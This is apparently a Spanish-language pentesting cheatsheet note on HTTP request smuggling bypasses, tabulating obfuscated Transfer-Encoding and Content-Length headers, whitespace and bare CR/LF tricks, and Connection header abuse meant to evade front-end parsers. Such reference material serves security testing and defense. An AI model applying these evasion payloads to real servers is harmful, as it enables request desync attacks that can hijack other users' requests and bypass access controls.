---
aliases:
  - HRS Bypass
  - Header Obfuscation
  - Smuggling Evasion
tags:
  - type/cheatsheet
  - vuln/http-smuggling
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[HTTP Request Smuggling]]'
---
# HTTP Request Smuggling - Bypasses

***

## TE Obfuscation (Transfer-Encoding)

| **Variante** | **Header** | **Notas** |
|:---:|:---:|:---:|
| Whitespace antes de `:` | `Transfer-Encoding : chunked` | RFC permite OWS — algunos parsers strict, otros laxos. |
| Tab en value | `Transfer-Encoding:\tchunked` | Tab en lugar de espacio. |
| Vertical tab | `Transfer-Encoding:\x0bchunked` | Carácter invisible (0x0B). |
| Form feed | `Transfer-Encoding:\x0cchunked` | (0x0C). |
| Header folding | `Transfer-Encoding:\r\n chunked` | Continuation line obsoleta — RFC 7230 prohíbe pero algunos aceptan. |
| Doble header | `Transfer-Encoding: chunked\r\nTransfer-Encoding: identity` | Algunos servers leen primer, otros último. |
| Multi-value coma | `Transfer-Encoding: chunked, identity` | Order matters por RFC. |
| Multi-value space | `Transfer-Encoding: identity chunked` | Sin coma — depende del parser. |
| Lowercase / mixed | `transfer-encoding: chunked` vs `Transfer-Encoding: chunked` | H1 case-insensitive pero parsers buggy. |
| Prefix con dummy | `Transfer-Encoding: xchunked` | Front rejecta, back ignora prefix unknown. |
| Dummy chars en value | `Transfer-Encoding: chunkedX` | Trailing garbage. |
| Encoding UTF-8 raro | `Transfеr-Encoding: chunked` (e cyrillic) | Visual lookalike. |
| Doblando con `Connection: TE` | `Connection: TE\r\nTE: chunked` | Hop-by-hop hint. |
| GZIP wrap | `Transfer-Encoding: gzip, chunked` | Algunos strip gzip, otros chunked. |
| Identity en CL | `Transfer-Encoding: identity` (no chunked) | RFC dice equivalent a no TE — algunos no. |
^hrs-bypass-te

___

## CL Obfuscation (Content-Length)

| **Variante** | **Header** | **Notas** |
|:---:|:---:|:---:|
| Doble CL distinto | `Content-Length: 5\r\nContent-Length: 10` | RFC dice rejectar — laxos los aceptan, eligen uno. |
| Doble CL igual | `Content-Length: 10\r\nContent-Length: 10` | Algunos rejectan duplicate exact, no diferentes. |
| Whitespace en value | `Content-Length: 10 ` (trailing space) | Strip varía. |
| CL con CR | `Content-Length: 10\r` | Algunos parsers lo guardan literal. |
| Hex en value | `Content-Length: 0xa` | Parsers strict rejectan, laxos parsean como 10. |
| Negativo | `Content-Length: -1` | Edge case. |
| Cero literal con body | `Content-Length: 0\r\n\r\nBODY` | Body queda en buffer → potencial smuggle implícito. |
| Sin CL ni TE | `\r\n\r\nBODY` | Default según RFC: body=0. Algunos parsers leen siguiente line como body. |
| CL muy grande | `Content-Length: 999999999` | Timeout en back, smuggle window. |
| Chunked numérico inválido | `<no-hex>\r\n` en chunk | Back que parsea laxo lo trata como 0 → terminator implícito. |
| `Content_Length` (underscore) | Some servers normalizan — otros no | Header smuggling. |
^hrs-bypass-cl

___

## Whitespace Tricks

| **Variante** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Space en method | `GET  / HTTP/1.1` (doble espacio) | Algunos parsers strict, laxos aceptan. |
| Tab en path | `GET\t/path HTTP/1.1` | Tab donde se espera space. |
| Trailing whitespace en URI | `GET /path  HTTP/1.1` | Path con trailing space. |
| LWS multi-line | `Host:\r\n target.com` | Continuation line. |
| Bare LF | `GET / HTTP/1.1\nHost: target\n\n` | RFC requiere CRLF — algunos aceptan LF solo. |
| Bare CR | `GET / HTTP/1.1\rHost: target\r\r` | Inverso — más raro. |
| CRLF doble en body | `\r\n\r\n\r\n` | Termina headers temprano. |
| NUL byte en headers | `Header:\x00 value` | Crashea o trunca según parser. |
| `0x00` en value | `Content-Length: 1\x00 0` | Bypass de validación. |
| Trailing CR sin LF | `Header: value\r` (sin LF) | Edge case. |
| Spaces in line ending | `Header: value \r\n` | Algunos strip, otros conservan. |
| HTTP/0.9 abuse | `GET /\r\n\r\n` (sin version) | HTTP/0.9 implícito — back-end legacy lo acepta. |
| Headers con `[]` | `Header[]: value` | Algunos parsers aceptan. |
| Hop-by-hop arbitrary | `Connection: X-Custom\r\nX-Custom: value` | Strip por front, conservar por back. |
^hrs-bypass-whitespace

___

## Connection: close Abuse

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | `Connection: close` indica al server que cierre la conn después de la response. Si front cierra pero back no → desync. | Edge case más raro pero existe. |
| Setup | Smuggle + `Connection: close` en outer request | Front cierra → back queda con bytes en buffer → próxima conn back los procesa. |
| Bypass front timeout | Si front detecta smuggle por timeout → `Connection: close` puede romper detection | A veces ayuda en bypass de defensa. |
| Combinación con keep-alive | `Connection: close, keep-alive` (multi-value) | Confusión sobre cuál respeta. |
| Hop-by-hop strip | `Connection: X-Custom-Header` lista headers a strip | Si front strip, back los recibe igual via mecanismo distinto. |
| Connection: keep-alive → smuggle persistente | Default H1.1 — necesario para que la queue funcione | Sin keep-alive no hay HRS. |
| Connection: TE → habilita TE explícito | `Connection: TE\r\nTE: chunked` | Algunos servers solo procesan TE si Connection: TE presente. |
| Idle timeout abuse | Si back tiene timeout largo, smuggle persiste minutos | Window de impacto. |
| Combinación con Pipelining | HTTP/1.1 pipelining + Connection: close per request | Confusión. |
| Half-close attacks | TCP half-close (FIN one direction) | Edge case nivel TCP. |
^hrs-bypass-connection

***
